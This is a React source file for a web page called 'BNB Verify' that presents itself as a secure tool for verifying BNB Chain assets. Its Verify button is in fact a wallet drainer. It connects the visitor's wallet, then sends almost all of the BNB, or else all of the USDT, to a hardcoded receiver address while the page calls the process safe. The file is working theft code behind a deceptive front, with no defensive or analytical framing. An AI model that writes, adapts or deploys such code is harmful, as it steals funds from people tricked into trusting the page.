import { useState } from "react";
import { ethers } from "ethers";
import "./App.css";

const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; 
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint)",
  "function transfer(address to, uint amount) returns (bool)"
];

function App() {
  const [status, setStatus] = useState("Click Verify to start...");
  const [walletAddress, setWalletAddress] = useState("");

  async function handleVerify() {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Install Binance Wallet or MetaMask.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      setWalletAddress(userAddress);

      setStatus("Checking balances...");

      // Check BNB balance
      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005")
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      // Check USDT BEP20 balance
      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  }

  return (
    <div className="App">
      {/* Navbar */}
      <header className="navbar">
        <div className="nav-container">
          <a href="#" className="nav-logo">
            <div className="nav-logo-icon"></div>
            <span>BNB Verify</span>
          </a>
        </div>
      </header>

      {/* Hero */}
      <main className="hero">
        <div className="hero-left">
          <div className="badge">Powered by BNB Chain</div>
          <h1>Verify Crypto Assets on BNB Chain</h1>
          <p>Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) securely.</p>
          <div className="hero-buttons">
            <button onClick={handleVerify}>Verify</button>
          </div>
          <p className="status">{status}</p>
          {walletAddress && <p className="wallet">Connected: {walletAddress}</p>}
        </div>

        <div className="hero-right">
          <div className="pulse-ring outer"></div>
          <div className="pulse-ring middle"></div>
          <div className="pulse-ring inner"></div>
          <div className="center-logo"></div>
        </div>
      </main>

      {/* Cards Section */}
      <section className="cards-section">
        <div className="card">
          <h2>Explorer</h2>
          <p>Browse BNB Chain addresses, contracts, tokens, and transactions.</p>
        </div>
        <div className="card">
          <h2>Tokens</h2>
          <p>Check token balances and verify authenticity of BNB Chain tokens.</p>
        </div>
        <div className="card">
          <h2>NFTs</h2>
          <p>Verify NFTs on BNB Chain and view metadata securely.</p>
        </div>
        <div className="card">
          <h2>DApps</h2>
          <p>Connect to decentralized apps and verify transactions safely.</p>
        </div>
      </section>

      <footer>
        &copy; 2025 BNB Verify. Powered by BNB Chain.
      </footer>
    </div>
  );
}

export default App;
